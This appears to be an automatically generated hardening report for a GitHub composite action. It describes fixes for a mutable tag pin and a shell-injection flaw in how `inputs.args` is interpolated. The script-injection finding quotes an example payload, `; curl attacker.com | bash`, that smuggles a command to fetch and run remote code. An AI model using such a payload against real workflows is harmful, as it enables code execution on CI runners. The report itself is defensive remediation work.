<!-- markdownlint-disable -->

# Hardening Report: dfreilich--pack-action/v2.0.15

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **dfreilich--pack-action/v2.0.15** was hardened automatically. 3 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### unpinned-uses (severity: high)

The composite action uses `buildpacks/github-actions/setup-pack@v4.1.0`, which is pinned to a mutable version tag (`v4.1.0`) rather than an immutable 40-character commit SHA. If the tag is moved or the upstream repository is compromised, the action will silently execute different code. It should be pinned to a full SHA, e.g. `buildpacks/github-actions/setup-pack@<40-char-sha> # v4.1.0`.

Locations:

- `action.yml:22`

### script-injection (severity: high)

Sub-rule (a): The `run-pack` step directly interpolates `${{ inputs.args }}` inside a shell `run:` command (`pack ${{ inputs.args }}`). Because GitHub Actions performs template substitution before the shell ever sees the string, an attacker can supply a malicious value for `inputs.args` (e.g. `; curl attacker.com | bash`) to achieve arbitrary command execution on the runner. The fix is to pass the value via an `env:` variable and reference it as a double-quoted shell variable: `env: { PACK_ARGS: "${{ inputs.args }}" }` and then `pack "$PACK_ARGS"`.

Locations:

- `action.yml:34`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.args }}" appears directly in run: block of step ""; move to env: map

Locations:

- `action.yml:34`

## Iteration Notes

### Iteration 1

**Fixes applied:** unpinned-uses, script-injection, static-inline-injection

**Notes:**

1. Pinned `buildpacks/github-actions/setup-pack@v4.1.0` to its full commit SHA `b3038dd2ada5d9ce26d9bdd0c4f81473297e4379` (tag preserved as comment). 2. Fixed script injection for `inputs.args` by moving it to an `env:` variable (`PACK_ARGS`) and using xargs-based tokenization into a bash array (since `args` is a list of CLI arguments), then expanding with `"${args[@]}"`.

